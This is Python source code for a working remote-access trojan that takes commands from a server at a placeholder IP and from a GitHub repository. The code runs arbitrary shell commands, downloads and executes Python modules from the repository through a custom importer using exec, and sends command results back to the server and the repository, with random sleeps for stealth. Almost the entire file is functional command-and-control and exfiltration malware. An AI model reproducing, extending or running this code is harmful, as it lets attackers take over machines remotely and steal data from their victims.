import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
import requests
import subprocess
from datetime import datetime

# Configuration for the Node.js Server
SERVER_URL = 'http://YOUR_VM_IP:3000' # Replace YOUR_VM_IP with the actual IP of your Ubuntu VM

# Function to connect to a GitHub repository using a token stored in a local file
def github_connect():
    # Read the token from 'secret.txt'
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'Soubhagya0101'  # GitHub username
    sess = github3.login(token=token)  # Login to GitHub using the token
    return sess.repository(user, 'making_it')  # Return the specific repository

# Function to retrieve the contents of a file from a specific directory in the GitHub repository
def get_file_contents(dirname, module_name, repo):
    # Fetch the file contents from the specified directory and module name
    return repo.file_contents(f'{dirname}/{module_name}').content

# Class representing the Trojan
class Trojan:
    def __init__(self, id):
        self.id = id  # Identifier for this Trojan instance
        self.config_file = f'{id}.json'  # Configuration file for the Trojan
        self.data_path = f'data/{id}/'  # Path to store data
        self.repo = github_connect()  # Connect to the GitHub repository
        self.report_status("started") # Send initial status to server

    # Method to send status updates to the Node.js server
    def report_status(self, status):
        try:
            requests.post(f'{SERVER_URL}/status', json={'id': self.id, 'status': status})
        except Exception as e:
            print(f"[-] Failed to report status: {e}")

    # Method to get the configuration from the Node.js server
    def get_config(self):
        try:
            response = requests.get(f'{SERVER_URL}/config')
            if response.status_code == 200:
                config = response.json()
                # Process commands from the server
                for task in config.get('commands', []):
                    # If it's a module, we need to ensure it's imported
                    if task['type'] == 'module':
                        if task['module'] not in sys.modules:
                            exec("import %s" % task['module'])
                return config
        except Exception as e:
            print(f"[-] Failed to fetch config from server: {e}")
        return {'commands': [], 'stop': False}

    # Method to run a specific command or module
    def module_runner(self, task):
        try:
            if task['type'] == 'shell':
                # Execute shell command
                result = subprocess.check_output(task['command'], shell=True, stderr=subprocess.STDOUT)
                result = result.decode('utf-8')
                self.store_module_result(task['command'], result)

            elif task['type'] == 'module' or task['type'] == 'c_module':
                # Execute Python module run() function
                module_name = task['module']
                result = sys.modules[module_name].run()
                self.store_module_result(module_name, result)
        except Exception as e:
            self.store_module_result(task.get('command') or task.get('module'), f"Error: {str(e)}")

    # Method to store the result in GitHub and report it to the Node.js server
    def store_module_result(self, command_name, data):
        # 1. Report to Node.js Server
        try:
            requests.post(f'{SERVER_URL}/command', json={'command': command_name, 'result': str(data)})
        except Exception as e:
            print(f"[-] Failed to report result to server: {e}")

        # 2. Store in GitHub
        try:
            message = datetime.now().isoformat()
            remote_path = f'data/{self.id}/{message}.data'
            bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
            self.repo.create_file(remote_path, message, bindata)
        except Exception as e:
            print(f"[-] Failed to store result in GitHub: {e}")

    # Main method to run the Trojan
    def run(self):
        while True:
            config = self.get_config()

            if config.get('stop'):
                self.report_status("stopped")
                print("[*] Stop signal received. Exiting...")
                break

            for task in config.get('commands', []):
                # Run each task in a new thread
                thread = threading.Thread(target=self.module_runner, args=(task,))
                thread.start()
                time.sleep(random.randint(1, 10))

            # Random sleep time between 30 seconds and 5 minutes for testing
            # (Adjusted from 30m-3h for easier validation during development)
            time.sleep(random.randint(30, 300))

# Class to dynamically import Python modules from the GitHub repository
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        try:
            self.repo = github_connect()
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None
        except Exception as e:
            print(f"[-] Error loading module {fullname}: {e}")
            return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)

# Main section of the script
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
